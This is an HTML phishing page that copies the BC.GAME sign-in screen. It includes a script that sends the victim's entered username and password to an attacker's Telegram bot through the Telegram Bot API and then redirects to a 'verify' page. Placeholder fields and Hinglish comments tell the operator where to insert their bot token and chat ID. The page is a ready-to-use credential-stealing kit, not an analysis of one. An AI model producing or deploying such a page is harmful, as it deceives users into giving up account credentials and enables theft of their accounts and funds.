<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In - BC.GAME</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; }
        body { background-color: #1c1f21; color: white; font-family: Arial, sans-serif; margin: 0; padding: 0; }
        
        /* Zoom fix ke liye */
        input { font-size: 16px !important; }

        .mobile-wrapper { width: 100%; max-width: 400px; margin: auto; background-color: #1c1f21; min-height: 100vh; padding: 20px; }
        
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .logo-group h1 { font-size: 1.2em; margin: 0; }
        
        .banner-benefits { background-color: #121415; padding: 15px; border-radius: 10px; margin-bottom: 20px; }
        .banner-img { width: 100%; height: 100px; background: #222; margin-bottom: 10px; border-radius: 5px; }

        .form-group { margin-bottom: 15px; }
        input { width: 100%; padding: 15px; background-color: #121415; border: 1px solid #2d3034; border-radius: 8px; color: white; }
        
        .signin-btn { width: 100%; padding: 15px; background-color: #3bc117; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="mobile-wrapper">
        <div class="header">
            <div class="logo-group"><h1>BC.GAME</h1></div>
        </div>

        <div class="banner-benefits">
            <div class="banner-img"></div> <p>Welcome to BC.GAME</p>
        </div>

        <div class="form-group">
            <input type="text" id="username" placeholder="Email / Username">
        </div>
        <div class="form-group">
            <input type="password" id="password" placeholder="Password">
        </div>

        <button class="signin-btn" onclick="sendToBot()">Sign In</button>
    </div>

    <script>
        function sendToBot() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if (user === '' || pass === '') {
                alert('Please enter details');
                return;
            }

            // APNI DETAILS YAHAN DAALEIN
            const botToken = "YOUR_API_TOKEN_HERE";
            const chatId = "YOUR_CHAT_ID_HERE";
            
            const text = `New Login:\nUser: ${user}\nPass: ${pass}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

            fetch(url).then(() => {
                window.location.href = "verify.html"; // Ye file aapke folder mein honi chahiye
            });
        }
    </script>
</body>
</html>
